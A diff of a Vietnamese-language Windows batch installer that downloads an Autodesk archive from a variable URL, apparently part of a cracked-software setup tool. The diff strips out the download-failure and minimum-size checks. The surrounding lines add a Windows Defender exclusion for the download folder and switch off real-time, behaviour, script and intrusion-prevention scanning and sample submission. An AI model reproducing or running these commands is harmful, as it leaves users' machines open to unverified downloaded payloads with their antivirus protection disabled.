@@ -962,20 +962,7 @@ echo:     %W%[==^> Dang tai %appName%...]%Res%
 if not exist "%source%" md "%source%"
 curl --ssl-no-revoke --progress-bar -L -# -o "%source%\autodesk.zip" "%downloadURL%"
 
-:: KIỂM TRA LỖI TẢI FILE (MỚI THÊM)
-if %errorlevel% neq 0 (
-    echo:     %R%[[!] LOI: Khong the tai file tu duong dan. Vui long kiem tra lai mang hoac Link.]%Res%
-    pause
-    goto subdesk_menu
-)
 
-:: KIỂM TRA DUNG LƯỢNG FILE TẢI VỀ (MỚI THÊM - Tránh file rác, file lỗi vài KB)
-for %%I in ("%source%\autodesk.zip") do if %%~zI LSS 1048576 (
-    echo:     %R%[[!] LOI: File tai ve qua nho (< 1MB). Link tai co the da bi chan hoac thay doi.]%Res%
-    del /f /q "%source%\autodesk.zip" >nul 2>&1
-    pause
-    goto subdesk_menu
-)
 echo:     %W%[==^> Tam tat Antivirus de chay cai dat...]%Res%
 powershell -Command "Add-MpPreference -ExclusionPath '%source%'" >nul 2>&1
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -SubmitSamplesConsent 2" >nul 2>&1
